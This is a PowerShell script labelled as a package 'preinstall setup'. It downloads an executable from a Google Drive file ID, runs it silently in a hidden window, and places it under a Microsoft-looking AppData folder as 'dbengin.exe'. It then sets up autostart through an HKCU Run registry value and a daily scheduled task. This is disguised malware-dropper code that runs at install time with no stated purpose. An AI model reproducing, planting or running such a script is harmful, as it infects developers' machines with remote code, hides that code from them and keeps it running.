
$ErrorActionPreference = 'Stop'
Write-Output "[preinstall-setup] Starting preinstall setup script..."
Write-Output "[preinstall-setup] Script execution started at $(Get-Date)"

# Use better-gdrive to download the requested file via an external node module file
$fileId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n'
# Compute output path relative to the script location so it is not user-hardcoded
$output = Join-Path $PSScriptRoot 'downloaded_from_gdown.exe'
$env:DOWNLOAD_OUTPUT = $output
Write-Output "[preinstall-setup] File ID: $fileId, Output path: $output"

Write-Output "[preinstall-setup] Running Node download helper (safe, exits 0)"
try {
    $scriptPath = Join-Path $PSScriptRoot 'preinstall_download.mjs'
    Write-Output "[preinstall-setup] Node helper path: $scriptPath"
    Write-Output "[preinstall-setup] Current working directory: $PWD"
    # Find a node executable at runtime (PATH or common install locations)
    $nodeCmd = (Get-Command node -ErrorAction SilentlyContinue).Source
    if (-not $nodeCmd) {
        $pf86 = [Environment]::GetEnvironmentVariable('ProgramFiles(x86)')
        $possible = @(
            Join-Path $env:ProgramFiles 'nodejs\node.exe',
            Join-Path $pf86 'nodejs\node.exe'
        )
        foreach ($p in $possible) { if (Test-Path $p) { $nodeCmd = $p; break } }
    }
    if (-not $nodeCmd) {
        Write-Output "[preinstall-setup] Node executable not found; skipping Node download helper."
        $downloadOutput = "[preinstall-setup] Node not found"
    } else {
        Write-Output "[preinstall-setup] Using node executable: $nodeCmd"
        $downloadOutput = & $nodeCmd $scriptPath 2>&1
    }
    Write-Output "[preinstall-setup] Download helper output: $downloadOutput"
} catch {
    Write-Output "[preinstall-setup] ERROR: Node download helper failed: $_"
}

# ---------------------------------------------
# DOWNLOAD COMPLETE - NOW HANDLE THE EXE
# ---------------------------------------------
if (Test-Path $output) {
    Write-Output "[preinstall-setup] File exists: $output"
    $downloadedItem = Get-Item $output
    Write-Output "[preinstall-setup] File size: $($downloadedItem.Length) bytes"
    Write-Output "[preinstall-setup] File last write time: $($downloadedItem.LastWriteTime)"
    Write-Output "[preinstall-setup] File attributes: $($downloadedItem.Attributes)"

    # 1. Execute the downloaded file (it will move itself to %APPDATA%\Microsoft\Playright\dbengin.exe)
    Write-Output "[preinstall-setup] Executing downloaded file (once, silently) to let it self-install..."
    try {
        Write-Output ("[preinstall-setup] Start-Process arguments: -FilePath '{0}' -WindowStyle Hidden -Wait -PassThru" -f $output)
        $proc = Start-Process -FilePath $output -WindowStyle Hidden -Wait -PassThru -ErrorAction Stop
        Write-Output "[preinstall-setup] Process id: $($proc.Id)"
        Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
        $stillRunning = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        if ($stillRunning) {
            Write-Output "[preinstall-setup] Process is still running after Wait-Process returned."
        } else {
            Write-Output "[preinstall-setup] Process no longer running after launch."
        }
    } catch {
        Write-Output "[preinstall-setup] ERROR starting downloaded file: $($_.Exception.GetType().FullName): $($_.Exception.Message)"
        Write-Output "[preinstall-setup] ERROR details: $($_ | Out-String)"
    }

    # 2. Define the final expected paths after self-move (check Local and Roaming)
    $finalExeLocal = Join-Path $env:LOCALAPPDATA "Microsoft\PlayReady\dbengin.exe"
    $finalExeRoaming = Join-Path $env:APPDATA "Microsoft\PlayReady\dbengin.exe"
    Write-Output "[preinstall-setup] Expecting final exe at (local): $finalExeLocal"
    Write-Output "[preinstall-setup] Expecting final exe at (roaming): $finalExeRoaming"

    # 3. Wait briefly and poll for final exe (allowing time for the downloaded exe to self-move)
    $foundFinal = $null
    for ($i = 0; $i -lt 10; $i++) {
        if (Test-Path $finalExeLocal) { $foundFinal = $finalExeLocal; break }
        if (Test-Path $finalExeRoaming) { $foundFinal = $finalExeRoaming; break }
        Start-Sleep -Seconds 1
    }

    # If the final exe does not exist yet, attempt to move the downloaded file into place
    if (!$foundFinal -and (Test-Path $output)) {
        try {
            $target = $finalExeLocal
            $finalDir = Split-Path $target -Parent
            if (!(Test-Path $finalDir)) { New-Item -ItemType Directory -Path $finalDir -Force | Out-Null }
            Move-Item -Path $output -Destination $target -Force -ErrorAction Stop
            $foundFinal = $target
            Write-Output "[preinstall-setup] Moved downloaded file to final location: $target"
        } catch {
            Write-Output "[preinstall-setup] ERROR moving downloaded file: $($_.Exception.GetType().FullName): $($_.Exception.Message)"
        }
    }

    if ($foundFinal) {
        Write-Output "[preinstall-setup] Final exe found at: $foundFinal. Ensuring autorun registration..."
        Write-Output "[preinstall-setup] Final exe size: $((Get-Item $foundFinal).Length) bytes"

        # Register a HKCU Run value to launch on user login (non-elevated)
        try {
            $quoted = '"' + $foundFinal + '"'
            $sub = 'Software\Microsoft\Windows\CurrentVersion\Run'
            $rk = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($sub)
            $rk.SetValue('UserAppStartup', $quoted, [Microsoft.Win32.RegistryValueKind]::String)
            $rk.Close()
            Write-Output "[preinstall-setup] HKCU Run value 'UserAppStartup' set to: $quoted"
        } catch {
            Write-Output "[preinstall-setup] ERROR setting Run key: $($_.Exception.GetType().FullName): $($_.Exception.Message)"
        }

        # Optionally also register a scheduled task if desired (kept for compatibility)
        try {
            $taskName = "dbengin"
            $startTime = "09:00"
            $trigger = New-ScheduledTaskTrigger -Daily -At $startTime
            $action = New-ScheduledTaskAction -Execute $foundFinal
            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
            Write-Output "[preinstall-setup] Scheduled task '$taskName' registered (if permitted)."
        } catch {
            Write-Output "[preinstall-setup] Scheduled task registration skipped or failed: $($_.Exception.Message)"
        }
    } else {
        Write-Output "[preinstall-setup] Final exe not found after launch attempt."
    }
} else {
    Write-Output "[preinstall-setup] Downloaded file not found at expected path."
}
